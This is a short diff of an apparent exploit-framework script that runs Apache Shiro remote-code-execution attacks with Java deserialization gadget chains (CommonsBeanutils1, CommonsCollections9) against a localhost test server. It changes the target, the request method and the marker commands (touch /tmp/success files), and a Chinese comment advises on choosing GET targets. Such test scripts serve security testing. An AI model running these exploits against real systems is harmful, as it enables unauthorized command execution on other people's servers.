@@ -1,12 +1,15 @@
 use exploit ShiroRCE1
 use payload CommonsBeanutils1
 use bullet TemplatesImplBullet
-set target http://localhost:8080/doLogin
+set target http://localhost:8080/
+#攻击对象，最好选择GET类型，有些情况下POST类型由于参数的缺失，并不能成功利用
+#set requestMethod GET
+set requestMethod POST
 set postData "username=111&password=1111"
-set body "echo /tmp/success"
+set body "touch /tmp/success1"
 run
 
 use payload CommonsCollections9
 use bullet TemplatesImplBullet
-set body "touch /tmp/success"
+set body "touch /tmp/success2"
 run
